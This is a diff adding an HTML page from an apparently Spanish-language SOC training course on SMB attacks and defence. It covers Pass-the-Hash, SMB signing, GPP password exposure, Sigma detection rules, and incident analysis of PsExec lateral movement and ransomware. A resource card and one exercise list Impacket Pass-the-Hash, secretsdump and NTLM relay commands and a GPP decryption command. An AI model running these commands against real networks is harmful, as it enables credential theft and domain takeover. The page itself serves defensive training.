+      <div class="slides-nav">
+        <button class="btn btn-secondary btn-prev" disabled data-i18n="btn.prev">← Anterior</button>
+        <div class="slides-progress"></div>
+        <button class="btn btn-primary btn-next" data-i18n="btn.next">Siguiente →</button>
+      </div>
+    </div><!-- /tab teoria -->
+
+    <!-- ── Tab: Ejercicios ── -->
+    <div class="tab-content" data-tab="ejercicios">
+      <div class="ejercicios-list">
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-01</span>
+            <span class="ejercicio-title" data-i18n="smb.ej1.title">¿Por qué Pass-the-Hash funciona contra NTLM?</span>
+            <span class="ejercicio-difficulty dif-easy" data-i18n="ej.easy">Fácil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="smb.ej1.q">Explicá por qué NTLM es vulnerable a Pass-the-Hash. ¿Qué debería cambiar en el protocolo para que PtH no funcionara? ¿Por qué Microsoft no simplemente "arregla" NTLM?</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+POR QUÉ FUNCIONA PtH:
+
+En NTLM, el "secreto" que demuestra identidad NO es la contraseña en sí,
+sino el HASH de la contraseña (NTHash = MD4(contraseña)).
+
+Flujo de autenticación NTLM:
+  Cliente → Servidor: "quiero autenticarme"
+  Servidor → Cliente: Challenge (8 bytes aleatorios)
+  Cliente → Servidor: Response = HMAC-MD5(NTHash, Challenge + contexto)
+  Servidor verifica: computa el mismo HMAC con el NTHash que tiene almacenado
+
+PROBLEMA: el servidor almacena y usa el NTHash como secreto.
+  Si tenés el NTHash → podés calcular el Response → te autenticás.
+  La contraseña real nunca viaja por la red → y tampoco es necesaria.
+
+QUÉ DEBERÍA CAMBIAR:
+  Para que PtH no funcione, el secreto que circula en el auth debería
+  ser derivado de algo que NO se almacena en el servidor:
+  → Kerberos con tickets: el DC emite tickets usando clave del usuario
+    (derivada de la contraseña), pero el ticket mismo caduca y no
+    puede ser reutilizado directamente (aunque hay Pass-the-Ticket)
+  → Challenge que incluya timestamp + nonce per-session para que el
+    Response no sea reproducible fuera del contexto original
+
+POR QUÉ MICROSOFT NO "ARREGLA" NTLM:
+  → Compatibilidad hacia atrás: miles de aplicaciones legacy usan NTLM
+  → Workgroups sin dominio: sin DC, Kerberos no existe
+  → Fallback inevitable: cuando el DC no está disponible
+  → Microsoft ya "dejó de recomendar NTLM" (deprecado en 2023)
+    y recomienda Kerberos + Protected Users Group
+  → El fix real es no usar NTLM, no parchear NTLM
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-02</span>
+            <span class="ejercicio-title" data-i18n="smb.ej2.title">¿Por qué SMB Signing previene el relay?</span>
+            <span class="ejercicio-difficulty dif-easy" data-i18n="ej.easy">Fácil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="smb.ej2.q">Si SMB Signing está habilitado, el relay falla. Explicá por qué técnicamente. ¿Qué firma exactamente? ¿El signing está habilitado por defecto en Windows?</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+QUÉ ES SMB SIGNING:
+  Cada mensaje SMB lleva una firma digital calculada con la
+  clave de sesión derivada del NTHash del usuario autenticado.
+  El receptor verifica la firma antes de procesar el mensaje.
+
+POR QUÉ PREVIENE EL RELAY:
+  En el relay, el atacante actúa como intermediario:
+    Víctima → Atacante → Target
+
+  Cuando se establece la sesión, se genera una "session key":
+    SessionKey = HMAC_MD5(NTHash, NT_Response)
+
+  PROBLEMA para el atacante:
+  → El atacante no tiene el NTHash (solo tiene el challenge/response
+    en tránsito, no puede extraer el hash)
+  → Sin NTHash → no puede calcular la SessionKey
+  → Sin SessionKey → no puede firmar los mensajes SMB
+  → El servidor Target rechaza mensajes sin firma válida
+  → El relay falla inmediatamente después de la autenticación
+
+ESTADO POR DEFECTO EN WINDOWS:
+  ┌─────────────────────┬──────────────────┬─────────────────────────┐
+  │ Sistema             │ Clientes (DC)    │ Servidores miembro       │
+  ├─────────────────────┼──────────────────┼─────────────────────────┤
+  │ Domain Controllers  │ Required         │ Required (desde 2022)   │
+  │ Domain Members      │ Enabled (no req) │ Enabled (no req)        │
+  │ Workgroup           │ Disabled         │ Disabled                │
+  └─────────────────────┴──────────────────┴─────────────────────────┘
+  "Enabled but not required" = el servidor acepta sesiones sin firma
+  → El atacante negocia "no signing" → el relay funciona igual
+
+  MITIGACIÓN: SetSmbServerConfiguration -RequireSecuritySignature $true
+  en TODOS los servidores y clientes del dominio.
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-03</span>
+            <span class="ejercicio-title" data-i18n="smb.ej3.title">Análisis de logs — detectar lateral movement SMB</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="smb.ej3.q">Analizá estos eventos y logs. Determiná qué está ocurriendo, quién es el atacante y qué hosts están comprometidos:</p>
+            <pre data-i18n="smb.pre8">
+# Windows Event Log (DC — 192.168.1.1):
+4625: Account=jperez  LogonType=3  SourceIP=192.168.1.99  (×3 en 1s)
+4624: Account=jperez  LogonType=3  SourceIP=192.168.1.99  AuthPkg=NTLM
+
+# Zeek smb_cmd.log:
+10:15:00  src=192.168.1.99  dst=192.168.1.1  cmd=TREE_CONNECT  \\DC\IPC$
+10:15:01  src=192.168.1.99  dst=192.168.1.1  cmd=TREE_CONNECT  \\DC\C$
+10:15:02  src=192.168.1.99  dst=192.168.1.1  cmd=NT_CREATE     \\PSEXESVC.exe
+
+# Zeek smb_files.log:
+10:15:02  src=192.168.1.99  path=\\DC\ADMIN$\PSEXESVC.exe  action=FILE_WRITE  size=179KB
+
+# Después:
+10:15:05  proceso: PSEXESVC.exe creado en DC como SYSTEM
+10:15:06  proceso: cmd.exe lanzado por PSEXESVC → whoami → "nt authority\system"</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+QUÉ ESTÁ OCURRIENDO: Lateral Movement via PsExec sobre SMB
+
+ANÁLISIS EVENTO A EVENTO:
+
+4625 × 3 en 1s (jperez desde 192.168.1.99):
+  → 3 intentos fallidos de autenticación en 1 segundo
+  → Esto puede ser un script automático probando credenciales
+  → O el típico patrón de impacket al intentar auth con hash
+
+4624 con AuthPkg=NTLM:
+  → DESPUÉS de los fallos, logon exitoso con NTLM
+  → Usando NTLM en dominio (no Kerberos) = IOC: posible PtH
+  → jperez no debería loguearse a las 10:15 en el DC directamente
+
+TREE_CONNECT a IPC$:
+  → Primer paso de cualquier herramienta SMB (enumeración RPC, auth)
+  → Normal en el inicio de conexión
+
+TREE_CONNECT a C$:
+  → Admin share → acceso administrativo completo al DC
+  → Solo administradores de dominio deberían hacer esto
+  → jperez es un usuario regular → ¡ALERTA!
+
+NT_CREATE PSEXESVC.exe + FILE_WRITE en ADMIN$:
+  → PsExec copia su servicio binario al servidor remoto via SMB
+  → El binario se escribe en C:\Windows\ (ADMIN$)
+  → Patrón inequívoco de PsExec / impacket psexec.py
+
+PSEXESVC como SYSTEM + cmd.exe:
+  → Ejecución remota de código como SYSTEM en el DC
+  → El atacante tiene control total del Domain Controller
+
+RECONSTRUCCIÓN DEL ATAQUE:
+  1. Atacante (192.168.1.99) obtuvo el hash NTLM de jperez
+  2. Ejecutó pass-the-hash para autenticarse en el DC
+  3. Usó PsExec (o psexec.py) → cargó PSEXESVC.exe via SMB
+  4. Obtuvo shell SYSTEM en el DC → comprometió el dominio completo
+
+ACCIONES:
+  → Aislar 192.168.1.99 INMEDIATAMENTE
+  → El DC está comprometido (SYSTEM = todo el AD está en riesgo)
+  → Resetear contraseña + hash de jperez Y de krbtgt (golden ticket risk)
+  → Forensics en el DC: qué ejecutó el atacante con SYSTEM
+  → Cambiar todas las contraseñas de cuentas privilegiadas
+  → Activar incident response: el dominio puede estar totalmente comprometido
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-04</span>
+            <span class="ejercicio-title" data-i18n="smb.ej4.title">SYSVOL y GPP — contraseñas en las políticas de grupo</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="smb.ej4.q">Un analista junior encuentra este archivo en \\DC\SYSVOL al revisar los logs de acceso SMB. ¿Qué es? ¿Es peligroso? ¿Qué hace el atacante con esto?</p>
+            <pre>
+Ruta: \\CORP.LOCAL\SYSVOL\CORP.LOCAL\Policies\{GUID}\
+      Machine\Preferences\Groups\Groups.xml
+
+Contenido:
+&lt;?xml version="1.0"?&gt;
+&lt;Groups&gt;
+  &lt;Group&gt;
+    &lt;Properties action="U" userName="LocalAdmin"
+      cpassword="edBSHOwhZLTjt/QS9FeIcJ7jaOIKq4RfZFLJG4ZHNtY="
+      changeLogon="0" noChange="0" neverExpires="1"/&gt;
+  &lt;/Group&gt;
+&lt;/Groups&gt;</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+QUÉ ES: Group Policy Preferences (GPP) con contraseña cifrada
+
+CONTEXTO:
+  GPP permitía a admins de Windows (2008 era) crear cuentas locales,
+  mapear drives o configurar servicios con credenciales via Group Policy.
+  La contraseña se almacenaba en SYSVOL cifrada con AES-256... pero
+  Microsoft publicó la clave AES en la documentación (MS-GPPREF).
+
+PELIGRO CRÍTICO:
+  1. SYSVOL es accesible por TODOS los usuarios del dominio (lectura)
+     → cualquier usuario autenticado puede leer Groups.xml
+  2. La clave AES es pública → cualquiera puede descifrar cpassword
+  3. El archivo puede llevar años ahí → admins que configuraron GPP
+     en 2010 y nunca limpiaron
+
+DESCIFRADO (inmediato):
+  gpDecrypt "edBSHOwhZLTjt/QS9FeIcJ7jaOIKq4RfZFLJG4ZHNtY="
+  # Resultado: P@ssw0rd2024! (o lo que sea la contraseña real)
+
+  # También con impacket:
+  Get-GPPPassword (PowerSploit)
+  python3 gpp-decrypt.py edBSHOwhZLTjt/QS9FeIcJ7jAOIKq4RfZFLJG4ZHNtY=
+
+QUÉ HACE EL ATACANTE:
+  1. Lee SYSVOL → encuentra Groups.xml con cpassword
+  2. Descifra → obtiene contraseña de LocalAdmin
+  3. LocalAdmin existe en TODOS los equipos del dominio (vía GPO)
+  4. Usa esa contraseña para moverse lateralmente a cualquier equipo
+  5. Si LocalAdmin tiene el mismo hash en todos (mismo pass) →
+     Pass-the-Hash masivo en toda la organización
+
+CVE-2014-1812 — Microsoft parchó esto eliminando el campo cpassword
+de la interfaz, pero los XML viejos siguen en SYSVOL sin limpiar.
+
+ACCIÓN:
+  → Buscar en SYSVOL: Get-ChildItem -Recurse \\DC\SYSVOL -Include *.xml
+    | Select-String "cpassword"
+  → Eliminar TODOS los archivos que contengan cpassword
+  → Cambiar la contraseña de LocalAdmin en todos los equipos
+  → Implementar LAPS (Local Administrator Password Solution) → contraseña
+    única por equipo, rotada automáticamente, almacenada en AD
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-05</span>
+            <span class="ejercicio-title" data-i18n="smb.ej5.title">Escribir regla Sigma — detección PsExec via SMB</span>
+            <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="smb.ej5.q">Escribí reglas Sigma para detectar: (1) Pass-the-Hash via SMB, (2) PsExec lateral movement, (3) acceso a SYSVOL buscando GPP passwords.</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+# 1 — Pass-the-Hash: logon NTLM exitoso después de fallos
+title: Pass-the-Hash via NTLM Authentication
+status: experimental
+logsource:
+  product: windows
+  service: security
+detection:
+  # Varios 4625 seguidos de 4624 con NTLM desde misma IP
+  failures:
+    EventID: 4625
+    LogonType: 3
+    AuthenticationPackageName: 'NTLM'
+  success:
+    EventID: 4624
+    LogonType: 3
+    AuthenticationPackageName: 'NTLM'
+  condition: failures | count() by IpAddress > 2 | timeframe 5s
+             AND success by same IpAddress within 10s
+level: high
+tags:
+  - attack.lateral_movement
+  - attack.t1550.002
+
+# 2 — PsExec lateral movement via SMB
+title: PsExec Execution via SMB
+logsource:
+  product: windows
+  service: system
+detection:
+  service_install:
+    EventID: 7045    # Service installed
+    ServiceName: 'PSEXESVC'
+  OR:
+  smb_write:
+    EventID: 5145    # SMB object access
+    ShareName: 'ADMIN$'
+    RelativeTargetName|contains: 'PSEXESVC'
+    AccessMask: '0x2'   # Write
+  condition: service_install OR smb_write
+level: critical
+tags:
+  - attack.lateral_movement
+  - attack.t1021.002
+
+# 3 — Búsqueda de GPP Passwords en SYSVOL
+title: GPP Password Hunting in SYSVOL
+logsource:
+  product: windows
+  service: security
+detection:
+  sysvol_access:
+    EventID: 5145    # Network share object access
+    ShareName: 'SYSVOL'
+    RelativeTargetName|contains:
+      - 'Groups.xml'
+      - 'Services.xml'
+      - 'ScheduledTasks.xml'
+      - 'Printers.xml'
+      - 'DataSources.xml'
+  filter_legitimate:
+    # Excluir DCs y sistemas de gestión legítimos
+    SubjectUserName|endswith: '$'   # cuentas de máquina
+  condition: sysvol_access AND NOT filter_legitimate
+level: medium
+tags:
+  - attack.credential_access
+  - attack.t1552.006
+
+# BONUS — Zeek: Admin share access desde host no admin
+title: SMB Admin Share Access (Zeek)
+# Usar en SIEM correlacionando smb_cmd.log
+detection:
+  selection:
+    proto: smb
+    command: TREE_CONNECT
+    tree|contains:
+      - '\\C$'
+      - '\\ADMIN$'
+      - '\\D$'
+  filter:
+    id.orig_h|in: ADMIN_HOSTS_WHITELIST
+  condition: selection AND NOT filter
+level: high
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-06</span>
+            <span class="ejercicio-title" data-i18n="smb.ej6.title">Detectar EternalBlue y PrintNightmare desde el SIEM</span>
+            <span class="ejercicio-difficulty dif-med" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="smb.ej6.q">Tu SIEM muestra estos eventos correlacionados. Identificá qué ataque representa cada uno, el CVE asociado, y qué acción inmediata tomarías como analista N1.</p>
+            <pre style="font-size:0.78rem;margin-bottom:0.8rem;" data-i18n="smb.pre10">
+EVENTO A — Suricata IDS alert (03:14:22):
+  alert: ET EXPLOIT Possible EternalBlue MS17-010 Echo Response
+  src: 10.0.5.88:445  →  dst: 10.0.5.92
+  proto: SMB  |  sid: 2024792  |  severity: HIGH
+  additional: [SMBv1 Trans2 SESSION_SETUP]
+
+EVENTO B — Windows Event Log en PRINT-SERVER-01 (03:14:45):
+  EventID: 808   (Print Spooler — carga de driver)
+  UserName: low_priv_user
+  DriverName: "Microsoft XPS Document Writer v4"
+  EventID: 4688  (Process Creation)
+  NewProcessName: C:\Windows\System32\spoolsv.exe
+  CommandLine: spoolsv.exe → [SYSTEM shell spawned]
+
+EVENTO C — Zeek conn.log (03:14:20):
+  10.0.5.88  →  10.0.5.92  TCP/445  duration: 0.003s  state: S0
+  10.0.5.88  →  10.0.5.93  TCP/445  duration: 0.003s  state: S0
+  10.0.5.88  →  10.0.5.94  TCP/445  duration: 0.003s  state: S0
+  [... 24 hosts más en 4 segundos, mismo patrón]</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+EVENTO A — EternalBlue (MS17-010):
+  CVE: CVE-2017-0144
+  Qué ves: Suricata detectó el patrón de Trans2 con overflow que usa EternalBlue.
+           El payload usa SMBv1 para un buffer overflow en el kernel de Windows.
+  Indicadores clave:
+    • SMBv1 activo (ya obsoleto — debería estar deshabilitado)
+    • Alert SID 2024792 = regla específica para MS17-010
+    • src:445 → dst = el atacante conecta al puerto SMB de la víctima
+  Acción N1 inmediata:
+    1. Aislar 10.0.5.92 del switch o VLAN (puede estar comprometido)
+    2. Escalar a N2/N3 — EternalBlue puede dar acceso SYSTEM sin autenticación
+    3. Confirmar si 10.0.5.88 es legítimo o es el atacante
+    4. Buscar en el SIEM: ¿hay más dst afectados?
+
+EVENTO B — PrintNightmare (CVE-2021-1675 / CVE-2021-34527):
+  CVE: CVE-2021-1675 (local) / CVE-2021-34527 (remoto vía RPC)
+  Qué ves: Un usuario con bajos privilegios cargó un driver de impresora,
+           y el proceso spoolsv.exe generó una shell con privilegios SYSTEM.
+  Indicadores clave:
+    • EventID 808 desde cuenta no-admin = PrintNightmare signature
+    • spoolsv.exe generando procesos hijos = explotación del spooler
+    • low_priv_user → SYSTEM = escalada de privilegios local confirmada
+  Acción N1 inmediata:
+    1. Aislar PRINT-SERVER-01
+    2. Detener el servicio Print Spooler: Stop-Service -Name Spooler
+    3. Revisar qué procesos creó esa shell SYSTEM (EventID 4688 chain)
+    4. Escalar — posible persistence instalada
+
+EVENTO C — Reconocimiento / Escaneo TCP/445 (precursor de EternalBlue):
+  Qué ves: El host 10.0.5.88 está escaneando TCP/445 en toda la /24.
+           state: S0 = SYN enviado, sin respuesta (host inaccesible o filtrado).
+           Duración 0.003s = escaneo automatizado, no manual.
+  Esto es el paso de descubrimiento ANTES del exploit del Evento A.
+  Indica: el atacante primero mapeó qué hosts tienen SMB abierto.
+  Acción N1: 10.0.5.88 es el origen — aislar INMEDIATAMENTE.
+             Buscar en EDR qué proceso generó ese escaneo.
+
+CONTEXTO GENERAL:
+  La secuencia Evento C → A → B es el patrón clásico de WannaCry/NotPetya:
+  1. Scan TCP/445 para descubrir víctimas
+  2. EternalBlue para comprometer hosts con SMBv1
+  3. PrintNightmare o Mimikatz para escalar y propagar
+
+DETECCIÓN PREVENTIVA:
+  • Deshabilitar SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false
+  • Deshabilitar Print Spooler en servidores que no son de impresión
+  • Bloquear TCP/445 entre workstations (solo DC y file-servers necesitan recibirlo)
+  • Regla Sigma para EventID 808 + no-admin user:
+      EventID: 808 AND UserName NOT IN (printing_admins_group)
+            </div>
+          </div>
+        </div>
+
+        <!-- Mini Challenge -->
+        <div class="mini-challenge">
+          <div class="challenge-label" data-i18n="ej.challenge">🚨 Mini-Challenge · Resolver el incidente</div>
+          <h3 data-i18n="smb.challenge.title">Incidente #SMB-001: "El ransomware que se mueve solo"</h3>
+          <p style="color:var(--text-secondary);font-size:0.9rem;margin-bottom:1rem;" data-i18n="smb.challenge.ctx">
+            Lunes 09:15. Helpdesk recibe 12 tickets simultáneos: archivos con extensión .locked en múltiples equipos. EDR reporta cifrado masivo en WORKSTATION-07, 12, 18 y el FILE-SERVER-01. El SIEM muestra actividad inusual SMB las últimas 2 horas.
+          </p>
+          <pre style="font-size:0.78rem;margin-bottom:1rem;" data-i18n="smb.pre11">
+Zeek smb_cmd.log (07:00 - 09:15):
+  07:03:00  src=192.168.1.55  dst=192.168.1.10  TREE_CONNECT  \\FS01\C$
+  07:03:01  src=192.168.1.55  dst=192.168.1.12  TREE_CONNECT  \\WS12\C$
+  07:03:02  src=192.168.1.55  dst=192.168.1.18  TREE_CONNECT  \\WS18\C$
+  07:03:05  src=192.168.1.55  múltiples NT_CREATE + FILE_WRITE en C$\Users\*
+
+Event 4624 (todos los destinos):
+  Account=administrator  LogonType=3  AuthPkg=NTLM  SourceIP=192.168.1.55
+
+nmap previo (06:50):
+  Zeek conn.log: 192.168.1.55 escaneó 192.168.1.0/24 TCP/445 — SF en 23 hosts</pre>
+          <div class="ejercicio-card" style="border-color:var(--proto-color);margin-top:0;">
+            <div class="ejercicio-header">
+              <span class="ejercicio-number">CHALLENGE</span>
+              <span class="ejercicio-title" data-i18n="smb.challenge.q">Timeline completo, contención y lecciones</span>
+              <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+            </div>
+            <div class="ejercicio-body">
+              <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver análisis completo</button>
+              <div class="respuesta-box">
+TIMELINE RECONSTRUIDO:
+
+~06:45 — Atacante gana acceso inicial a 192.168.1.55 (WORKSTATION-55)
+         Método: phishing, exploit web, credenciales robadas — a investigar
+         El atacante obtiene hashes NTLM del equipo (Mimikatz/secretsdump)
+         Obtiene el hash de "administrator" local (mismo en todos los equipos)
+
+06:50 — Port scan TCP/445 en toda la /24
+         192.168.1.55 → /24:445 → 23 hosts respondieron con SF
+         Objetivo: mapear qué equipos tienen SMB accesible
+
+07:03 — Pass-the-Hash masivo + propagación del ransomware
+         Usa hash de administrator para autenticarse en 23 hosts via NTLM
+         LogonType=3 (network) AuthPkg=NTLM = PtH confirmado
+         TREE_CONNECT a C$ = acceso al disco completo
+         NT_CREATE + FILE_WRITE = copia el ransomware y lo ejecuta
+         (posiblemente via PsExec o WMI)
+
+07:03 - 09:15 — Ransomware cifrando archivos silenciosamente
+         Los usuarios dormían o empezaban el día → no notaron hasta 09:15
+
+09:15 — Usuarios reportan .locked → alerta SOC
+
+CONTENCIÓN INMEDIATA:
+
+T+0: Aislar 192.168.1.55 del switch (es el "paciente zero" activo)
+T+1: Aislar FILE-SERVER-01 (tiene todos los archivos compartidos en riesgo)
+T+2: Bloquear TCP/445 saliente en todos los segmentos via firewall de borde
+T+3: Deshabilitar la cuenta "administrator" local en todos los equipos
+T+5: Verificar los 23 hosts del scan → ¿cuántos tienen archivos cifrados?
+T+10: Activar DRP — ¿cuándo fue el último backup de FILE-SERVER-01?
+
+INVESTIGACIÓN:
+
+¿Cómo obtuvo el hash?
+→ Revisar 192.168.1.55: ¿hay Mimikatz/secretsdump en prefetch, amcache?
+→ ¿Hubo acceso a LSASS? Event 4656/4663 en WORKSTATION-55
+
+¿Por qué el hash funcionó en TODOS los hosts?
+→ Respuesta probable: misma contraseña de administrador local en toda la org
+→ Sin LAPS → hash idéntico → Pass-the-Hash total
+
+LECCIONES:
+
+1. LAPS: contraseña única por equipo → un hash robado no funciona en otros
+2. SMB Signing: habría requerido SessionKey → el relay/PtH es más difícil
+3. Segmentación: bloquear TCP/445 entre workstations → el movimiento lateral
+   requeriría pasar por un firewall
+4. Protected Users + Credential Guard: el hash de administrator en memoria
+   estaría protegido → Mimikatz no podría extraerlo
+5. EDR con protección de LSASS → detecta el dump de hashes antes de PtH
+6. Alerta temprana: el port scan a las 06:50 debería haber generado alerta
+   → Sigma: count(unique_dst) by src > 10 where dport=445 / 60s
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /tab ejercicios -->
+
+    <!-- ── Tab: Recursos ── -->
+    <div class="tab-content" data-tab="recursos">
+
+      <div class="section-title" data-i18n="rec.official">📄 Documentación Oficial</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type">Microsoft</div>
+          <h4>MS17-010 — EternalBlue Security Bulletin</h4>
+          <a class="recurso-link" href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010" target="_blank" rel="noopener">→ Microsoft Security Bulletin MS17-010</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">Microsoft</div>
+          <h4>SMB Security Best Practices</h4>
+          <a class="recurso-link" href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-security" target="_blank" rel="noopener">→ learn.microsoft.com: SMB Security</a>
+        </div>
+      </div>
+
+      <div class="section-title" data-i18n="rec.tools">🛠️ Herramientas SOC</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.offensive.lab">Ofensiva · Lab</div>
+          <h4>Impacket — suite SMB</h4>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;"># Pass-the-Hash
+smbclient.py -hashes :NTLMHASH DOMAIN/user@target
+psexec.py -hashes :HASH DOMAIN/Admin@target
+
+# Dump hashes SMB via Impacket
+secretsdump.py -hashes :HASH DOMAIN/Admin@target
+# NTLM Relay
+ntlmrelayx.py -tf targets.txt -smb2support</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.defense.lab">Defensa · Lab</div>
+          <h4 data-i18n="smb.rec.cme">CrackMapExec — auditoría SMB</h4>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;"># Verificar SMB Signing en la red
+cme smb 192.168.1.0/24 --gen-relay-list unsigned.txt
+
+# Enumerar shares
+cme smb 192.168.1.0/24 -u user -p pass --shares</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.defense.ids">Defensa · IDS</div>
+          <h4 data-i18n="smb.rec.responder">Responder — detector de envenenamiento</h4>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;"># Modo pasivo — solo detecta, no responde
+responder -I eth0 -A
+
+# Suricata: ruleset SMB (ET Open)
+# sid:2024792 — EternalBlue MS17-010
+# sid:2027865 — SMB Relay detectado</pre>
+        </div>
+      </div>
+
+      <div class="section-title mt-3">🔒 CVEs Relevantes</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type">CVE</div>
+          <h4>CVE-2017-0144 — EternalBlue (MS17-010)</h4>
+          <p data-i18n="smb.rec.cve1">RCE sin autenticación via SMBv1. Usado por WannaCry y NotPetya. CVSS 9.3.</p>
+          <a class="recurso-link" href="https://nvd.nist.gov/vuln/detail/CVE-2017-0144" target="_blank" rel="noopener">→ nvd.nist.gov/CVE-2017-0144</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">CVE</div>
+          <h4>CVE-2021-34527 — PrintNightmare</h4>
+          <p data-i18n="smb.rec.cve2">RCE / LPE via Windows Print Spooler. Escalada a SYSTEM desde usuario sin privilegios.</p>
+          <a class="recurso-link" href="https://nvd.nist.gov/vuln/detail/CVE-2021-34527" target="_blank" rel="noopener">→ nvd.nist.gov/CVE-2021-34527</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">CVE</div>
+          <h4>CVE-2020-1472 — Zerologon</h4>
+          <p data-i18n="smb.rec.cve3">Bypass de autenticación Netlogon → toma de control de Domain Controller. CVSS 10.0.</p>
+          <a class="recurso-link" href="https://nvd.nist.gov/vuln/detail/CVE-2020-1472" target="_blank" rel="noopener">→ nvd.nist.gov/CVE-2020-1472</a>
+        </div>
+      </div>
+
+      <div class="section-title">🎯 MITRE ATT&CK</div>
+      <div class="recursos-grid">
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&CK</div>
+          <h4>T1550.002 — Pass-the-Hash</h4>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1550/002/" target="_blank" rel="noopener">→ attack.mitre.org/T1550/002</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&CK</div>
+          <h4>T1557.001 — LLMNR/NBT-NS Poisoning (SMB Relay)</h4>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1557/001/" target="_blank" rel="noopener">→ attack.mitre.org/T1557/001</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&CK</div>
+          <h4>T1021.002 — Remote Services: SMB/Windows Admin Shares</h4>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1021/002/" target="_blank" rel="noopener">→ attack.mitre.org/T1021/002</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&CK</div>
+          <h4>T1552.006 — Unsecured Credentials: Group Policy Preferences</h4>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1552/006/" target="_blank" rel="noopener">→ attack.mitre.org/T1552/006</a>
+        </div>
+      </div>
+
+    </div><!-- /tab recursos -->
+
+  </main>
+
+  <script src="../theme-switcher.js"></script>
+  <script src="../i18n-core.js"></script>
+  <script src="../i18n-smb.js"></script>
+  <script src="../shared.js"></script>
+  <script src="app.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      SOC.initSlides('smb-slides');
+      SOC.initEjercicios();
+      SOC.saveProgress('smb', 'demo');
+    });
+  </script>
+</body>
+</html>
